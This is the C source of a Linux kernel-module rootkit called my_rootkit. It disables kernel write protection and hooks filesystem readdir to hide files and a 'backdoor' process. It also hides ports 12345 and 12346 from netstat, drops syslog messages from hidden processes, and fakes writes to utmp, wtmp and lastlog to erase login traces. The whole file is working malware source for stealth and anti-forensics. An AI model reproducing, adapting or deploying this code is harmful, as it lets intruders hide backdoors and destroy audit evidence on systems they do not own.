#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>

#include <linux/sched.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/mount.h>
#include <linux/spinlock.h> //spinlock_t

#include <linux/slab.h> //kmalloc kfree
#include <linux/list.h>
#include <linux/proc_fs.h> //PROC_ROOT_INO
#include <net/tcp.h>		//hide netstat
#include <linux/socket.h> //clean syslog
#include <net/af_unix.h>  //UNIXCB
#include "my_rootkit.h"

#include <linux/version.h>


void setback_cr0(unsigned int val)
{
    asm volatile("movl %%eax, %%cr0"
               :
               : "a"(val)
               );
}
 
unsigned int clear_cr0_save(void)
{
	unsigned int cr0 = 0;
	unsigned int ret;
	__asm__ __volatile__ ("movl %%cr0, %%eax":"=a"(cr0));
	ret = cr0;

	cr0 &= 0xfffeffff;
	asm volatile ("movl %%eax, %%cr0":: "a"(cr0));
	return ret;
}
//hide files and processes
typedef int (*readdir_t)(struct file *, void *, filldir_t);
struct hide_file {
	char *name;
	struct list_head list;
};

static void k_hide_file(struct list_head *root, char *name)

{
	struct hide_file *hf = NULL;

	if (NULL==root || NULL==name) return;

	hf = kmalloc(sizeof(struct hide_file), GFP_KERNEL);
	if (!hf) return;

	hf->name = name;
	INIT_LIST_HEAD(&hf->list);
	list_add(&hf->list, root);
}
#if 0
static void k_unhide_file(struct list_head *root, char *name)
{
	struct hide_file *hf = NULL;

	if (NULL==root || NULL==name) return;

	list_for_each_entry(hf, root, list) {
		if (!strcmp(name, hf->name)) {
			list_del(&hf->list);
			hf->name = NULL;
			kfree(hf);
			break;
		}
	}
}
#endif
static void k_free_list(struct list_head *root)
{
	struct hide_file *hf = NULL, *n = NULL;

	if (NULL == root) return;

	list_for_each_entry_safe(hf, n, root, list) {
		if (NULL != hf) {
			list_del(&hf->list);
			hf->name = NULL;
			kfree(hf);
		}
	}
}
//hide files
//hack /
LIST_HEAD(hide_files);
char *root_fs = "/";    
struct super_block *root_sb[1024];
readdir_t orig_root_readdir = NULL;
filldir_t orig_root_filldir = NULL;

static int my_root_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	struct hide_file *hf = NULL;
	int r = 0;
	
	if (!root_sb[current->pid%1024]) return 0;

	//hide files
	if (orig_root_filldir) {
		if (name) {
			list_for_each_entry(hf, &hide_files, list) {
				if (!strcmp(hf->name, name)) {
					my_rootkit_debug("successfully hide %s\n", name);
					return 0;
				}
			}
		}

		r = orig_root_filldir(buf, name, nlen, off, ino, x);
	}
	return r;
}
static int my_root_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	if (!fp || !fp->f_vfsmnt || !fp->f_vfsmnt->mnt_sb || !buf || !filldir || !orig_root_readdir)
		return 0;

	orig_root_filldir = filldir;
	root_sb[current->pid%1024] = fp->f_vfsmnt->mnt_sb;
	my_rootkit_debug("Here in root readdir\n");
	r = orig_root_readdir(fp, buf, (filldir_t)my_root_filldir);

	return r;
}
//hack /etc
char *etc_fs = "/etc";  
struct super_block *etc_sb[1024];  
readdir_t orig_etc_readdir = NULL;
filldir_t orig_etc_filldir = NULL;

static int my_etc_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	struct hide_file *hf = NULL;
	int r = 0;
	
	if (!etc_sb[current->pid%1024]) return 0;

	//hide files
	if (orig_etc_filldir) {
		if (name) {
			list_for_each_entry(hf, &hide_files, list) {
				if (!strcmp(hf->name, name)) {
					printk(KERN_INFO "successfully hide %s\n", name);
					return 0;
				}
			}
		}
		r = orig_etc_filldir(buf, name, nlen, off, ino, x);
	}
	return r;
}
static int my_etc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	if (!fp || !fp->f_vfsmnt || !fp->f_vfsmnt->mnt_sb || !buf || !filldir || !orig_etc_readdir)
		return 0;

	orig_etc_filldir = filldir;
	etc_sb[current->pid%1024] = fp->f_vfsmnt->mnt_sb;
	my_rootkit_debug("Here in etc readdir\n");
	r = orig_etc_readdir(fp, buf, (filldir_t)my_etc_filldir);
	return r;
}
//hide processes
//hack /proc 
LIST_HEAD(hide_processes);
char *proc_fs = "/proc";
readdir_t orig_proc_readdir = NULL;
filldir_t orig_proc_filldir = NULL;
spinlock_t proc_filldir_lock;

static int myatoi(char *str)
{
    int res = 0, mul = 1;
    char *ptr = NULL;

    for (ptr = str + strlen(str) - 1; ptr >= str; ptr--)
    {
        if (*ptr < '0' || *ptr > '9') //error
            return -1;
        res += (*ptr - '0') * mul;
        mul *= 10;
    }
    return res;
}
static struct task_struct* get_task(pid_t pid)
{
    struct task_struct *p = get_current(),*entry=NULL;

	//my_rootkit_debug("get_task p=%p\n",p);
    list_for_each_entry(entry,&(p->tasks),tasks)
    {
		//my_rootkit_debug("get_task entry->pid=%d pid=%d\n",entry->pid,pid);
        if(entry->pid == pid)
        {
            //printk(KERN_DEBUG "pid found=%d\n",entry->pid);
            return entry;
        }
    }
    return NULL;
}
#if 0
static char* get_name(struct task_struct *p, char *buf)
{
    int i;
    char *name = NULL;
	unsigned char c;

	if (NULL == p || NULL == buf) return NULL;
	my_rootkit_debug("get_name task->comm=%s\n", p->comm);
    name = p->comm;
    i = sizeof(p->comm);
    do {
		c = *name;
        name++;  i--;
        *buf = c;
        if (!c) break;
        if (c == '\\') {
            buf[1] = c;
            buf += 2;
            continue;
        }
        if (c == '\n')
        {
            buf[0] = '\\';
            buf[1] = 'n';
            buf += 2;
            continue;
        }
        buf++;
    } while (i);
    *buf = '\n';
    return buf + 1;
}
#endif
static int get_process_name(char *process_name, pid_t pid)
{
	struct task_struct *task = NULL;

	if (NULL == process_name || pid < 0) return -1;

	if (NULL == (task=get_task(pid))) return -1;
	memcpy(process_name, task->comm, sizeof(task->comm));
	//if (NULL == get_name(task, process_name)) return -1;
	return 0;
}
//find : 1, not find : -1
static int process_should_be_hidden(pid_t pid)
{
	struct hide_file *hf = NULL;
	char process_name[TASK_COMM_LEN] = "0";	

	if (-1 == get_process_name(process_name, pid))//error
		return -1;
	list_for_each_entry(hf, &hide_processes, list) {
		if (strstr(process_name, hf->name)) {
			return 1;
		}
	}
	return -1;
}
static int my_proc_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	int r = 0;
	pid_t pid = -1;

	//my_rootkit_debug("name=%s\n", name);

	pid = myatoi((char*)name);
	if (-1 == pid) { goto end; }

	//my_rootkit_debug("process_name: %s\n", process_name);
	//hide processes
	if (orig_proc_filldir) {
		if (name) {
			if (0 == process_should_be_hidden(pid)) {
			//list_for_each_entry(hf, &hide_processes, list) {
				//if (strstr(process_name, hf->name)) {
					my_rootkit_debug("vfs: successfully hide %s\n", name);
					return 0;
				//}
			//}
			}
		}
end:
		r = orig_proc_filldir(buf, name, nlen, off, ino, x);
	}
	return r;
}
static int my_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;
	//struct kstat fbuf;

	spin_lock(&proc_filldir_lock);
	orig_proc_filldir = filldir;
	my_rootkit_debug("Here in proc readdir\n");
	//vfs_getattr(fp->f_path.mnt,fp->f_path.dentry,&fbuf);
	//my_rootkit_debug("ino:%d, proc:%d,major:%d,minor:%d\n", fbuf.ino, PROC_ROOT_INO, MAJOR(fbuf.dev), MINOR(fbuf.dev)); 
	//if(fbuf.ino == PROC_ROOT_INO && !MAJOR(fbuf.dev) && MINOR(fbuf.dev) == 3) {
	//	my_rootkit_debug("This is /proc file\n");
	//}
	r = orig_proc_readdir(fp, buf, (filldir_t)my_proc_filldir);
	spin_unlock(&proc_filldir_lock);
	return r;
}

static int hack_vfs(const char *path, readdir_t *orig_readdir, readdir_t new_readdir)
{
	struct file *filep = NULL;
	my_rootkit_debug("hack_vfs: begin\n");
	filep = filp_open(path, O_RDONLY, 0);	
	if (IS_ERR(filep)) {
		my_rootkit_debug("Failed to open file %s\n", path);
		return -1;
	}
	my_rootkit_debug("hack_vfs: filep_open ok\n");
	
	if (orig_readdir) {
		*orig_readdir = ((struct file_operations *)(filep->f_op))->readdir;
	}
	if (*orig_readdir == my_root_readdir) { //Has hacked the readdir of the filesystem
		*orig_readdir = NULL;
		return 0;
	}
	((struct file_operations *)(filep->f_op))->readdir = new_readdir;
	my_rootkit_debug("hack_vfs: change f_op ok\n");
	
	filp_close(filep, 0);
	my_rootkit_debug("hack_vfs: end\n");
	return 0;

}
static int unhack_vfs(const char *path, readdir_t orig_readdir)
{
	struct file *filep = NULL;
	my_rootkit_debug("unhack_vfs: begin\n");
	filep = filp_open(path, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
		return -1;
	}
	my_rootkit_debug("unhack_vfs: filep_open ok\n");
	
	if (orig_readdir)
		((struct file_operations *)(filep->f_op))->readdir = orig_readdir;
	my_rootkit_debug("unhack_vfs: change f_op ok\n");

	filp_close(filep, 0);
	my_rootkit_debug("unhack_vfs: end\n");
	return 0;
}
//hide netstat
#define MY_TMPSZ 150 //tcp_ipv4.c line 2497
typedef int(*tcp4_seq_show_t)(struct seq_file*,void*);
tcp4_seq_show_t orig_tcp4_seq_show = NULL;
static unsigned short g_hide_ports[] = {12345, 12346, 0};

static struct proc_dir_entry* find_proc_tcp(void)
{
	struct proc_dir_entry *p = NULL;
	if (NULL==init_net.proc_net || NULL==init_net.proc_net->subdir) {
		my_rootkit_debug("Failed to find tcp from /proc\n");
		return NULL;
	}
	p = init_net.proc_net->subdir;
	//my_rootkit_debug("/proc/net/%s\n", p->name);
	while (p && strcmp(p->name,"tcp")) {
		//my_rootkit_debug("/proc/net/%s\n", p->name);
		p = p->next;
	}
	return p;
}
char* strnstr(const char *src, const char *needle, size_t n)
{
	char *s = strstr(src, needle);
	if (NULL == s) return NULL;
	if (s-src+strlen(needle) <= n)
		return s;
	else return NULL;
}
static int my_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int i = 0, r = 0;
	char port[12];
	char *s = NULL;

	r = orig_tcp4_seq_show(seq, v);
	for (i = 0; g_hide_ports[i]; i++) {
		sprintf(port, ":%04X", g_hide_ports[i]);
		//my_rootkit_debug("\n\n++++++++count=%d port=%s\n",seq->count,port);
		//my_rootkit_debug("========one msg:\n%s\n",seq->buf+seq->count-MY_TMPSZ);
		s = strnstr(seq->buf+seq->count-MY_TMPSZ, port, MY_TMPSZ);
		if (s) {
			//my_rootkit_debug("=========Find dist=%d\n",s-(seq->buf+seq->count-MY_TMPSZ));
			//my_rootkit_debug("buf:%s\n", seq->buf);
			seq->count -= MY_TMPSZ;
			break;
		}
		//else {
			//my_rootkit_debug("=========Not Find\n");
			//my_rootkit_debug("buf:%s\n", seq->buf);
		//}
	}

	return r;
}

#define errmsg_hack_tcp4_seq_show "Failed to hack tcp4_seq_show!"
static int hack_tcp4_seq_show(tcp4_seq_show_t *old_func, tcp4_seq_show_t new_func)
{
	struct proc_dir_entry *pde = NULL;
	struct tcp_seq_afinfo *t_afinfo = NULL;
	
	pde = find_proc_tcp();
	if (NULL == pde) {
       my_rootkit_debug("%s pde is NULL\n", errmsg_hack_tcp4_seq_show);
	   return -1;
	}
	t_afinfo = (struct tcp_seq_afinfo*)pde->data;
	if (NULL == t_afinfo) {
		my_rootkit_debug("%s t_afinfo is NULL\n", errmsg_hack_tcp4_seq_show);
		return -1;
	}
	if (NULL == t_afinfo->seq_ops.show) {
		my_rootkit_debug("%s orig_tcp4_seq_show is NULL\n", errmsg_hack_tcp4_seq_show);
		return -1;
	}
	if (NULL != old_func) {
		*old_func = t_afinfo->seq_ops.show;
	}
	if (NULL == new_func) {
		my_rootkit_debug("%s new tcp4_seq_show is NULL\n", errmsg_hack_tcp4_seq_show);
		return -1;
	}
	t_afinfo->seq_ops.show = new_func;
	return 0;
}
static int unhack_tcp4_seq_show(tcp4_seq_show_t new_func)
{
	return hack_tcp4_seq_show(NULL, new_func);
}
//clean log
//clean syslog
static int (*orig_unix_dgram_recvmsg)(struct kiocb *, struct socket *, struct msghdr *, size_t, int) = NULL;
static int (*orig_unix_stream_recvmsg)(struct kiocb *, struct socket *, struct msghdr *, size_t, int) = NULL;
static struct proto_ops *unix_dgram_ops = NULL;
static struct proto_ops *unix_stream_ops = NULL;
static 	char *log[] = {"syslog", "rsyslogd", NULL};

static int my_unix_stream_recvmsg(struct kiocb *iocb, struct socket *sock, struct msghdr *msg, size_t size, int flags)
{
	struct sock *sk = NULL;
	struct sk_buff *skb = NULL;
	int err = 0;
	struct ucred creds = {0};	
	int find = -1, i = 0;

	if (!msg || !sock) goto out;
	for (i = 0; log[i]; i++) {
		if (0 == strncmp(current->comm, log[i], strlen(log[i])) || !msg || !sock) {
			break;
		}
	}
	if (i == sizeof(log)/sizeof(log[0])-1) goto out;

	my_rootkit_debug("tcp current->comm: %s\n", current->comm);

	sk = sock->sk;

	err = -EINVAL;
	if (sk->sk_state != TCP_ESTABLISHED) goto out;

	err = -EOPNOTSUPP;
	if (flags & MSG_OOB) goto out;

	do {
		msg->msg_namelen = 0;
		unix_state_lock(sk);
		skb = skb_peek(&sk->sk_receive_queue);
		if (NULL == skb) {
			unix_state_unlock(sk);
			goto out;
		}
		unix_state_unlock(sk);
		cred_real_to_ucred(UNIXCB(skb).pid, UNIXCB(skb).cred, &creds);
		//my_rootkit_debug("In my_unix_stream_recvmsg creds.pid=%d\n", creds.pid);
		if (1 == (find=process_should_be_hidden(creds.pid)))
			skb_dequeue(&sk->sk_receive_queue);
	} while(1 == find);
out:
	err = orig_unix_stream_recvmsg(iocb, sock, msg, size, flags);
    return err;
}
static int my_unix_dgram_recvmsg(struct kiocb *kio, struct socket *sock, struct msghdr *msg, size_t size, int flags)
{
	struct sock *sk = NULL;
	int noblock = flags & MSG_DONTWAIT;
	struct sk_buff *skb = NULL;
	int err;
	struct ucred creds = {0};
	int find = -1, i = 0;

	if (!msg || !sock) goto out;
	for (i = 0; log[i]; i++) {
		if (0 == strncmp(current->comm, log[i], strlen(log[i]))) {
			break;
		}
	}
	//Have found all log files
	if (i >= sizeof(log)/sizeof(log[0])-1) goto out;

	my_rootkit_debug("udp current->comm: %s\n", current->comm);

	sk = sock->sk;

	err = -EOPNOTSUPP;
	if (flags & MSG_OOB) goto out;

	do {
		msg->msg_namelen = 0;
	    skb = skb_recv_datagram(sk, flags|MSG_PEEK, noblock, &err);
        if (!skb) goto out;
		
		cred_real_to_ucred(UNIXCB(skb).pid, UNIXCB(skb).cred, &creds);
		//my_rootkit_debug("In my_unix_dgram_recvmsg creds.pid=%d\n", creds.pid);
		if (1 == (find=process_should_be_hidden(creds.pid)))
			skb_dequeue(&sk->sk_receive_queue);
	} while (1 == find);
out:
	err = orig_unix_dgram_recvmsg(kio, sock, msg, size, flags);
    return err;
}
static int hack_syslog(void)
{
	struct socket *udp_sock = NULL, *tcp_sock = NULL;
#if 0
//#ifdef MODIFY_PAGE_TABLES
	pgd_t *pgd = NULL;
	pmd_t *pmd = NULL;
	pte_t *pte = NULL, new_pte;
//#ifdef FOUR_LEVEL_PAGING
	pud_t *pud = NULL;
//#endif
//#endif
#endif
	
	// PF_UNIX 1(linux/socket.h), SOCK_DGRAM 2 (linux/net.h)
	//family: PF_UNIX 1  type: SOCK_STREAM 1 protocol: 
	if (sock_create(PF_UNIX, SOCK_DGRAM, 0, &udp_sock) < 0) return -1;
	if (sock_create(PF_UNIX, SOCK_STREAM, 0, &tcp_sock) < 0) return -1;
#if 0
//#ifdef MODIFY_PAGE_TABLES
	pgd = pgd_offset_k((unsigned long)sock->ops);
//#ifdef FOUR_LEVEL_PAGING
	pud = pud_offset(pgd, (unsigned long)sock->ops);
	pmd = pmd_offset(pud, (unsigned long)sock->ops);
//#else
//	pmd = pmd_offset(pgd, (unsigned long)sock->ops);
//#endif
	pte = pte_offset_kernel(pmd, (unsigned long)sock->ops);
	new_pte = pte_mkwrite(*pte);
	set_pte(pte, new_pte);
//#endif /* Page-table stuff */
#endif
	if (udp_sock && (unix_dgram_ops = (struct proto_ops *)udp_sock->ops)) {
		orig_unix_dgram_recvmsg = unix_dgram_ops->recvmsg;
		unix_dgram_ops->recvmsg = my_unix_dgram_recvmsg;
		sock_release(udp_sock);
	}
	if (tcp_sock && (unix_stream_ops = (struct proto_ops *)tcp_sock->ops)) {
		orig_unix_stream_recvmsg = unix_stream_ops->recvmsg;
		unix_stream_ops->recvmsg = my_unix_stream_recvmsg;
		sock_release(tcp_sock);
	}
//	my_rootkit_debug("unix_dgram_ops=%p, udp-recvmsg=%p\n", unix_dgram_ops,unix_dgram_ops->recvmsg);
//	my_rootkit_debug("unix_stream_ops=%p, udp-stream=%p\n", unix_stream_ops,unix_stream_ops->recvmsg);
//	my_rootkit_debug("my_unix_dgram_recvmsg=%p\n", my_unix_dgram_recvmsg);
//	my_rootkit_debug("my_unix_stream_recvmsg=%p\n", my_unix_stream_recvmsg);
	return 0;
}
//clean wtmp vtmp lastlog
static struct file *var_files[] = { NULL, NULL, NULL, NULL };
static char *var_filenames[] = {
	"/var/run/utmp",
	"/var/log/wtmp",
	"/var/log/lastlog",
	NULL
};
static ssize_t (*orig_var_write)(struct file *, const char *, size_t, loff_t *) = NULL;

static ssize_t my_var_write(struct file *f, const char *buf, size_t blen, loff_t *off)
{
	int i = 0;
	struct hide_file *hf = NULL;	
		
	// if it tries to write to the /var files, fake it
	list_for_each_entry(hf, &hide_processes, list) {
		if (strnstr(current->comm,hf->name,sizeof(current->comm))) {
			for (i = 0; var_filenames[i]; ++i) {
				if (var_files[i] &&
			    	var_files[i]->f_dentry->d_inode->i_ino == f->f_dentry->d_inode->i_ino) {
					*off += blen;
					my_rootkit_debug("In my_var_write hide %s log successfully",hf->name);
					return blen;
				}
			}
		}
	}
	return orig_var_write(f, buf, blen, off);
}	
static int hack_log_files(void)
{
	int i = 0, changed = 0;

	for (i = 0; var_filenames[i]; ++i) {
		var_files[i] = filp_open(var_filenames[i], O_RDONLY, 0);
		if (IS_ERR(var_files[i])) {
			var_files[i] = NULL;
			continue;
		}
		if (!changed) {	// just replace one time, they are all the same FS
			orig_var_write = ((struct file_operations *)(var_files[i]->f_op))->write;
			((struct file_operations *)(var_files[i]->f_op))->write = my_var_write;
			changed = -1;
		}
	}
	return changed;
}
static void unhack_log_files(void)
{
	int i = 0, changed = 0;

	for (i = 0; var_filenames[i]; ++i) {
		if (var_files[i]) {
			if (!changed) {
				((struct file_operations *)(var_files[i]->f_op))->write = orig_var_write;
				changed = 1;
			}
			filp_close(var_files[i], 0);
		}
	}
}
//Initialize the module
static int __init my_rootkit_init(void)
{
	unsigned int cr0;
	
	my_rootkit_debug("Begin in init_module\n");
	
	k_hide_file(&hide_files, "my_rootkit.ko");
	k_hide_file(&hide_files, "remove_module.ko");
	k_hide_file(&hide_files, "my_rootkit.sh");
	k_hide_file(&hide_files, "my_rootkit_init.sh");
	k_hide_file(&hide_files, "my_rootkit_sh");
	k_hide_file(&hide_files, "S75my_rootkit");
	k_hide_file(&hide_files, "backdoor");
	k_hide_file(&hide_processes, "backdoor");

	cr0 = clear_cr0_save();
	//hack root filesystem
	if (-1 == hack_vfs(root_fs, &orig_root_readdir, my_root_readdir))
		my_rootkit_debug("Failed to hack root readdir\n");
	//hack /etc filesystem
	if (-1 == hack_vfs(etc_fs, &orig_etc_readdir, my_etc_readdir))
		my_rootkit_debug("Failed to hack etc readdir\n");
#if 1
	//hack /proc filesystem	
	spin_lock_init(&proc_filldir_lock);
	//hide processes
	if (-1 == hack_vfs(proc_fs, &orig_proc_readdir, my_proc_readdir))
		my_rootkit_debug("Failed to hack proc readdir\n");	
	//hide net state
	hack_tcp4_seq_show(&orig_tcp4_seq_show, my_tcp4_seq_show);	
	//clean log
	hack_syslog();
	hack_log_files();
#endif
	setback_cr0(cr0);
	
	my_rootkit_debug("End in init_module\n");
	return 0;
}
//Exit the module
static void __exit my_rootkit_exit(void)
{
	unsigned int cr0;
	my_rootkit_debug("Begin in cleanup_module\n");

	cr0 = clear_cr0_save();
	if (orig_root_readdir && -1 == unhack_vfs(root_fs, orig_root_readdir))
		my_rootkit_debug("Failed to unhack root readdir\n");
	if (orig_etc_readdir && -1 == unhack_vfs(etc_fs, orig_etc_readdir))
		my_rootkit_debug("Failed to unhack etc readdir\n");
#if 1
	if (orig_proc_readdir && -1 == unhack_vfs(proc_fs, orig_proc_readdir))
		my_rootkit_debug("Failed to unhack proc readdir\n");
	if (orig_tcp4_seq_show)
		unhack_tcp4_seq_show(orig_tcp4_seq_show);
	if (unix_stream_ops && orig_unix_stream_recvmsg)
		unix_stream_ops->recvmsg = orig_unix_stream_recvmsg;
	if (unix_dgram_ops && orig_unix_dgram_recvmsg)
		unix_dgram_ops->recvmsg = orig_unix_dgram_recvmsg;
	unhack_log_files();
#endif
	setback_cr0(cr0);
	k_free_list(&hide_files);
	k_free_list(&hide_processes);
	my_rootkit_debug("End in cleanup_module\n");
}
MODULE_AUTHOR("ChHuWaLi");
MODULE_LICENSE("Dual BSD/GPL");
module_init(my_rootkit_init);
module_exit(my_rootkit_exit);
